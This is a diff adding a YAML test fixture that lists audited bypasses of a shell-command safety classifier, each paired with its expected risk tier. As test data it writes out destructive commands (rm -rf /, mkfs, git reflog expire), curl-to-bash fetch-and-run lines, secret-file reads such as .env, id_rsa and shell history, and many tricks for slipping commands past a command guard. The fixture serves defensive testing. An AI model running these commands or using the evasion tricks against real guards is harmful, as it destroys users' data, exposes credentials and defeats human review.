@@ -1,0 +1,318 @@
+# Bypasses found by the November 2026 audit. Each was reproduced before the fix.
+# See docs/analysis/2026-11-audit.md, section 4.
+
+# Heredocs and herestrings hide commands from the walker.
+- {cmd: "cat <<EOF | sh\nrm -rf ~\nEOF", tier: denied, staged: null}
+- {cmd: "cat <<EOF | bash\necho hi\nEOF", tier: denied, staged: null}
+- {cmd: "cat <<EOF && rm -rf /\nhi\nEOF", tier: denied, staged: null}
+- {cmd: "cat <<EOF; rm -rf /\nhi\nEOF", tier: needs-review, staged: null}
+- {cmd: "cat <<EOF\n$(rm x)\nEOF", tier: needs-review, staged: null}
+- {cmd: "cat <<EOF\n${x:-$(rm x)}\nEOF", tier: needs-review, staged: null}
+- {cmd: "cat <<< \"$(rm x)\"", tier: needs-review, staged: null}
+- {cmd: "sh <<EOF\nls\nEOF", tier: denied, staged: null}
+- {cmd: "bash <<< 'rm -rf ~'", tier: denied, staged: null}
+- {cmd: "cat <<EOF\nplain text\nEOF", tier: read-only}
+
+# Expansions were treated as opaque text.
+- {cmd: "echo ${x:-$(rm y)}", tier: needs-review, staged: null}
+- {cmd: "echo $(( $(rm x) ))", tier: needs-review, staged: null}
+- {cmd: "echo \"${x:-$(rm y)}\"", tier: needs-review, staged: null}
+- {cmd: "X=\"$(rm y)\" ls", tier: needs-review, staged: null}
+
+# Dynamic arguments can become write or exec flags at runtime.
+- {cmd: "find . $(echo -delete)", tier: needs-review}
+- {cmd: "find . \"$x\"", tier: needs-review}
+- {cmd: "sed $(echo -i) s/a/b/ f", tier: needs-review}
+- {cmd: "awk \"$prog\" f", tier: needs-review}
+- {cmd: "rg $flags x", tier: needs-review}
+- {cmd: "sort $flags f", tier: needs-review}
+- {cmd: "git $sub", tier: needs-review}
+- {cmd: "cat $FILE", tier: read-only}
+- {cmd: "ls $(pwd)", tier: read-only}
+- {cmd: "wc -l \"$f\"", tier: read-only}
+
+# ANSI-C strings were not decoded.
+- {cmd: "find . $'-\\x64elete'", tier: denied, staged: null}
+- {cmd: "$'r\\x6d' -rf x", tier: needs-review}
+- {cmd: "cat $'\\x2eenv'", tier: needs-review}
+
+# sed: any command in any script can write or execute.
+- {cmd: "sed '1w pwned' f", tier: needs-review}
+- {cmd: "sed '1e rm x' f", tier: needs-review}
+- {cmd: "sed -e p -e 'w pwned' f", tier: needs-review}
+- {cmd: "sed '$w pwned' f", tier: needs-review}
+- {cmd: "sed '/x/,/y/w pwned' f", tier: needs-review}
+- {cmd: "sed 's/a/b/w pwned' f", tier: needs-review}
+- {cmd: "sed 's/a/b/e' f", tier: needs-review}
+- {cmd: "sed -n '1!w pwned' f", tier: needs-review}
+- {cmd: "sed '{w pwned\n}' f", tier: needs-review}
+- {cmd: "sed --expression='w pwned' f", tier: needs-review}
+- {cmd: "sed -ne 'w pwned' f", tier: needs-review}
+- {cmd: "sed --debug s/a/b/ f", tier: needs-review}
+- {cmd: "sed 's/a/w/' f", tier: read-only}
+- {cmd: "sed -n '1,5p' f", tier: read-only}
+- {cmd: "sed -E 's/(a|b)/x/g; /z/d' f", tier: read-only}
+- {cmd: "sed -e 's|/usr|/opt|' f", tier: read-only}
+- {cmd: "sed '/^#/d;$!N' f", tier: read-only}
+
+# In-place sed variants are destructive and get a backup.
+- {cmd: "sed -ni 's/a/b/p' f", tier: changes-files, never_raw: true, staged_contains: "-i.bak"}
+- {cmd: "sed -Ei 's/a/b/' f", tier: changes-files, never_raw: true, staged_contains: "-i.bak"}
+
+# awk: the first positional is not always the program.
+- {cmd: "awk -v a=1 'BEGIN{system(\"rm x\")}'", tier: needs-review}
+- {cmd: "awk -F: 'BEGIN{system(\"rm x\")}' f", tier: needs-review}
+- {cmd: "awk -F : 'BEGIN{system(\"rm x\")}' f", tier: needs-review}
+- {cmd: "awk -fprog.awk f", tier: needs-review}
+- {cmd: "awk --file=prog.awk f", tier: needs-review}
+- {cmd: "gawk -e 'BEGIN{system(\"rm x\")}'", tier: needs-review}
+- {cmd: "gawk -l filefuncs 'BEGIN{print 1}'", tier: needs-review}
+- {cmd: "awk 'BEGIN{\"rm x\" | getline}'", tier: needs-review}
+- {cmd: "awk '{print > \"pwned\"}' f", tier: needs-review}
+- {cmd: "awk -F, '{s+=$2} END{print s}' f.csv", tier: read-only}
+- {cmd: "awk -F, -v k=2 '$k > 5 {print $1}' f.csv", tier: read-only}
+
+# Read-only commands with flags or arguments that write or execute.
+- {cmd: "rg --pre ./evil x", tier: needs-review}
+- {cmd: "rg --pre=./evil x", tier: needs-review}
+- {cmd: "rg --hostname-bin ./evil x", tier: needs-review}
+- {cmd: "man -P 'rm x' ls", tier: denied, staged: null}
+- {cmd: "man --pager='rm x' ls", tier: needs-review}
+- {cmd: "man -H ls", tier: needs-review}
+- {cmd: "man ls", tier: read-only}
+- {cmd: "uniq a b", tier: changes-files}
+- {cmd: "uniq -c a", tier: read-only}
+- {cmd: "xxd -r a b", tier: needs-review}
+- {cmd: "xxd a b", tier: changes-files}
+- {cmd: "xxd a", tier: read-only}
+- {cmd: "tree -o out", tier: changes-files}
+- {cmd: "tree -L 2", tier: read-only}
+- {cmd: "less -o out f", tier: needs-review}
+- {cmd: "less -O out f", tier: needs-review}
+- {cmd: "less --log-file=out f", tier: needs-review}
+- {cmd: "date -s 20200101", tier: needs-review}
+- {cmd: "date 010100002030", tier: needs-review}
+- {cmd: "date +%F", tier: read-only}
+- {cmd: "sysctl -w a.b=1", tier: needs-review}
+- {cmd: "sysctl a.b=1", tier: needs-review}
+- {cmd: "sysctl hw.memsize", tier: read-only}
+- {cmd: "sort --compress-program=./evil f", tier: needs-review}
+- {cmd: "tar -tf a.tar --to-command=./evil", tier: needs-review}
+- {cmd: "tar -tf a.tar --use-compress-program=./evil", tier: needs-review}
+- {cmd: "tar -tzf a.tgz", tier: read-only}
+- {cmd: "info -o out ls", tier: needs-review}
+- {cmd: "file -C -m magic", tier: needs-review}
+- {cmd: "hostname evil", tier: needs-review}
+- {cmd: "hostname", tier: read-only}
+- {cmd: "arch -x86_64 rm x", tier: denied, staged: null}
+- {cmd: "arch", tier: read-only}
+- {cmd: "ps eww", tier: needs-review}
+- {cmd: "ps aux", tier: read-only}
+
+# git rules were too loose.
+- {cmd: "git stash", tier: changes-files}
+- {cmd: "git stash list", tier: read-only}
+- {cmd: "git branch newb", tier: changes-files}
+- {cmd: "git branch -a", tier: read-only}
+- {cmd: "git branch --contains abc", tier: read-only}
+- {cmd: "git reflog expire --expire=now --all", tier: denied, staged: null}
+- {cmd: "git reflog delete HEAD@{0}", tier: denied, staged: null}
+- {cmd: "git reflog", tier: read-only}
+- {cmd: "git grep -Orm x", tier: needs-review}
+- {cmd: "git grep --open-files-in-pager=rm x", tier: needs-review}
+- {cmd: "git grep x", tier: read-only}
+- {cmd: "git --config-env=core.pager=X log", tier: needs-review}
+- {cmd: "git -ccore.pager=evil log", tier: needs-review}
+- {cmd: "git --exec-path=/tmp log", tier: needs-review}
+
+# Path traversal in the command name.
+- {cmd: "/usr/bin/../../tmp/ls", tier: needs-review}
+- {cmd: "/bin/../tmp/cat f", tier: needs-review}
+- {cmd: "/bin/ls", tier: read-only}
+
+# Destructive commands behind wrappers were staged raw with a review badge.
+- {cmd: "env rm -rf /", tier: denied, staged: null}
+- {cmd: "env -i rm -rf ~", tier: denied, staged: null}
+- {cmd: "env FOO=1 rm -rf build", tier: denied, staged: null}
+- {cmd: "env sudo rm -rf /", tier: denied, staged: null}
+- {cmd: "command rm -rf ~", tier: denied, staged: null}
+- {cmd: "builtin rm -rf ~", tier: denied, staged: null}
+- {cmd: "nohup rm -rf build", tier: denied, staged: null}
+- {cmd: "nice -n 5 rm -rf build", tier: denied, staged: null}
+- {cmd: "time sudo rm -rf /", tier: denied, staged: null}
+- {cmd: "timeout 5 rm -rf build", tier: denied, staged: null}
+- {cmd: "timeout -k 1 5 dd if=/dev/zero of=x", tier: denied, staged: null}
+- {cmd: "exec rm -rf build", tier: denied, staged: null}
+- {cmd: "env ls", tier: needs-review}
+- {cmd: "time ls", tier: needs-review}
+- {cmd: "command -v ls", tier: read-only}
+
+# Interpreters running inline code.
+- {cmd: "sh -c 'rm -rf ~'", tier: denied, staged: null}
+- {cmd: "bash -c 'rm -rf build'", tier: denied, staged: null}
+- {cmd: "bash -lc 'sudo ls'", tier: denied, staged: null}
+- {cmd: "eval 'rm -rf /'", tier: denied, staged: null}
+- {cmd: "eval rm -rf /", tier: denied, staged: null}
+- {cmd: "python3 -c 'import shutil; shutil.rmtree(\"x\")'", tier: denied, staged: null}
+- {cmd: "perl -e 'unlink \"x\"'", tier: denied, staged: null}
+- {cmd: "sh -c 'ls'", tier: needs-review}
+- {cmd: "python3 -c 'print(1)'", tier: needs-review}
+
+# Code fetched or computed at runtime.
+- {cmd: "bash <(curl -s http://x)", tier: denied, staged: null}
+- {cmd: "source <(curl -s http://x)", tier: denied, staged: null}
+- {cmd: ". <(curl -s http://x)", tier: denied, staged: null}
+- {cmd: "eval \"$(curl -s http://x)\"", tier: denied, staged: null}
+- {cmd: "sh -c \"$(curl -s http://x)\"", tier: denied, staged: null}
+- {cmd: "python3 <(wget -qO- x)", tier: denied, staged: null}
+
+# Destructive commands that had no rule at all.
+- {cmd: "mkfs.ext4 /dev/sda1", tier: denied, staged: null}
+- {cmd: "wipefs -a /dev/sda", tier: denied, staged: null}
+- {cmd: "chmod -R 777 /", tier: denied, staged: null}
+- {cmd: "chmod -R 777 ~", tier: denied, staged: null}
+- {cmd: "chown -R me /", tier: denied, staged: null}
+- {cmd: "find / -delete", tier: denied, staged: null}
+- {cmd: "find ~ -name x -delete", tier: denied, staged: null}
+- {cmd: "find . -delete", tier: denied, staged: null}
+- {cmd: "find . -name '*.tmp' -delete", tier: changes-files, never_raw: true, staged_contains: "trash"}
+- {cmd: "docker system prune -af", tier: denied, staged: null}
+- {cmd: "docker rm -f x", tier: denied, staged: null}
+- {cmd: "kubectl delete ns prod", tier: denied, staged: null}
+- {cmd: "rsync -a --delete a/ b/", tier: denied, staged: null}
+
+# git operations that destroy work are not staged raw.
+- {cmd: "git rm -rf .", tier: changes-files, staged: null}
+- {cmd: "git checkout -- .", tier: changes-files, staged: null}
+- {cmd: "git checkout .", tier: changes-files, staged: null}
+- {cmd: "git restore .", tier: changes-files, staged: null}
+- {cmd: "git push --force", tier: changes-files, staged: null}
+- {cmd: "git push -f origin main", tier: changes-files, staged: null}
+- {cmd: "git branch -D main", tier: changes-files, staged: null}
+- {cmd: "git push origin main", tier: changes-files, staged: "git push origin main"}
+- {cmd: "git checkout main", tier: changes-files, staged: "git checkout main"}
+- {cmd: "git rm --cached x", tier: changes-files, staged: "git rm --cached x"}
+
+# ln -f overwrites its target.
+- {cmd: "ln -sf a b", tier: changes-files, staged: null}
+- {cmd: "ln -s a b", tier: changes-files, staged: "ln -s a b"}
+
+# Secret reads classified as read-only.
+- {cmd: "cat server.pem", tier: needs-review}
+- {cmd: "cat id_dsa", tier: needs-review}
+- {cmd: "cat id_ecdsa", tier: needs-review}
+- {cmd: "cat credentials.json", tier: needs-review}
+- {cmd: "cat app.key", tier: needs-review}
+- {cmd: "cat keys.p12", tier: needs-review}
+- {cmd: "cat .envrc", tier: needs-review}
+- {cmd: "cat .env_prod", tier: needs-review}
+- {cmd: "cat .env-prod", tier: needs-review}
+- {cmd: "cat .ENV", tier: needs-review}
+- {cmd: "cat .en*", tier: needs-review}
+- {cmd: "cat .en?", tier: needs-review}
+- {cmd: "cat ~/.ss*/id_rsa", tier: needs-review}
+- {cmd: "cat id_*", tier: needs-review}
+- {cmd: "head *.pem", tier: needs-review}
+- {cmd: "cat ~/.npmrc", tier: needs-review}
+- {cmd: "cat ~/.pypirc", tier: needs-review}
+- {cmd: "cat ~/.zsh_history", tier: needs-review}
+- {cmd: "tail ~/.bash_history", tier: needs-review}
+- {cmd: "cat ~/.config/gh/hosts.yml", tier: needs-review}
+- {cmd: "cat notes.txt", tier: read-only}
+- {cmd: "cat keyboard.md", tier: read-only}
+- {cmd: "wc -l *.py", tier: read-only}
+- {cmd: "ls *", tier: read-only}
+
+# Quoted patterns are regexes, not globs. These legitimate commands must stay read-only.
+- {cmd: "grep 'ERROR' app.log | sed 's/.*ERROR //' | sed 's/:.*//' | sort -u", tier: read-only}
+- {cmd: "sed 's/.*ERROR \\([a-z]*\\):.*/\\1/' app.log", tier: read-only}
+- {cmd: "grep '.*failed' app.log", tier: read-only}
+- {cmd: "cat '.en*'", tier: read-only}
+- {cmd: "cat \".en*\"", tier: read-only}
+
+# Second pass, attacks not known when the first fixes were written.
+# Brace expansion turns one word into several, including flags and secret paths.
+- {cmd: "find . {-delete,-print}", tier: needs-review}
+- {cmd: "find . -{delete,print}", tier: needs-review}
+- {cmd: "sed {-i,-n} s/a/b/ f", tier: needs-review}
+- {cmd: "cat {.env,a}", tier: needs-review}
+- {cmd: "cat .e{n,x}v", tier: needs-review}
+- {cmd: "cat ~/.{ssh,aws}/config", tier: needs-review}
+- {cmd: "ls {a,b}", tier: read-only}
+- {cmd: "wc -l {a,b}.py", tier: read-only}
+- {cmd: "grep '{a,b}' f", tier: read-only}
+
+# Backslash-newline joins words in the shell.
+- {cmd: "r\\\nm x", tier: needs-review, staged: null}
+- {cmd: "fi\\\nnd . -delete", tier: denied, staged: null}
+
+# Case-insensitive filesystems: RM really runs rm on a default macOS install.
+- {cmd: "RM x", tier: changes-files, staged: null}
+- {cmd: "Rm -rf x", tier: changes-files, staged: null}
+- {cmd: "SUDO ls", tier: denied, staged: null}
+- {cmd: "FIND . -delete", tier: denied, staged: null}
+- {cmd: "Git reset --hard", tier: denied, staged: null}
+- {cmd: "ls | SH", tier: denied, staged: null}
+
+# zsh does not treat # as a comment at an interactive prompt by default, so these run the rm.
+- {cmd: "cat f # ; rm x", tier: needs-review, staged: null}
+- {cmd: "ls # && rm -rf x", tier: needs-review, staged: null}
+- {cmd: "ls #comment", tier: needs-review}
+
+# History expansion runs a different command from the one displayed.
+- {cmd: "!!", tier: needs-review, staged: null}
+- {cmd: "!rm", tier: needs-review, staged: null}
+- {cmd: "ls !!", tier: needs-review, staged: null}
+- {cmd: "echo \"!rm\"", tier: needs-review, staged: null}
+- {cmd: "^a^b", tier: needs-review, staged: null}
+- {cmd: "find . ! -name x", tier: read-only}
+- {cmd: "echo 'hi!'", tier: read-only}
+- {cmd: "echo $!", tier: read-only}
+
+# zsh-only syntax the bash grammar can't see into.
+- {cmd: "ls *(e:'rm x':)", tier: needs-review, staged: null}
+- {cmd: "ls =(rm x)", tier: needs-review, staged: null}
+- {cmd: "echo =rm", tier: needs-review, staged: null}
+- {cmd: "echo ${(e)x}", tier: needs-review, staged: null}
+
+# A shell reached through a wrapper is still a shell.
+- {cmd: "ls | env sh", tier: denied, staged: null}
+- {cmd: "ls | command sh", tier: denied, staged: null}
+- {cmd: "ls | xargs sh", tier: denied, staged: null}
+- {cmd: "ls | nice bash", tier: denied, staged: null}
+
+# git options that run programs, or discard work.
+- {cmd: "git fetch --upload-pack=./evil", tier: needs-review}
+- {cmd: "git clone --upload-pack=./evil x", tier: needs-review}
+- {cmd: "git clone -u ./evil x", tier: needs-review}
+- {cmd: "git pull --upload-pack=./evil", tier: needs-review}
+- {cmd: "git push --receive-pack=./evil", tier: needs-review}
+- {cmd: "git --git-dir=/tmp/x log", tier: needs-review}
+- {cmd: "git --work-tree=/tmp status", tier: needs-review}
+- {cmd: "git stash drop", tier: changes-files, staged: null}
+- {cmd: "git stash clear", tier: changes-files, staged: null}
+- {cmd: "git clone https://x/y.git", tier: changes-files, staged: "git clone https://x/y.git"}
+
+# A destructive command given as an argument to something opaque.
+- {cmd: "git submodule foreach rm -rf .", tier: denied, staged: null}
+- {cmd: "git bisect run rm x", tier: denied, staged: null}
+- {cmd: "git rebase --exec 'rm x' HEAD", tier: denied, staged: null}
+- {cmd: "ssh host rm -rf x", tier: denied, staged: null}
+- {cmd: "trap 'rm x' EXIT", tier: denied, staged: null}
+- {cmd: "docker run alpine rm -rf x", tier: denied, staged: null}
+- {cmd: "ssh host ls", tier: needs-review}
+
+# In-place edits and overwrites with no rewrite.
+- {cmd: "perl -pi -e 's/a/b/' f", tier: needs-review, staged: null}
+- {cmd: "ruby -i -pe 'x' f", tier: needs-review, staged: null}
+- {cmd: "unzip -o f.zip", tier: changes-files, staged: null}
+- {cmd: "gzip -f f", tier: changes-files, staged: null}
+- {cmd: "gunzip -f f.gz", tier: changes-files, staged: null}
+
+# bc can reach a shell through dc on some systems.
+- {cmd: "bc", tier: needs-review}
+- {cmd: "echo '!rm x' | bc", tier: needs-review}
+- {cmd: "bc < f", tier: needs-review}
+- {cmd: "bc f", tier: needs-review}
+- {cmd: "echo 1+1 | bc", tier: read-only}
+- {cmd: "jq .x f | paste -sd+ - | bc", tier: read-only}
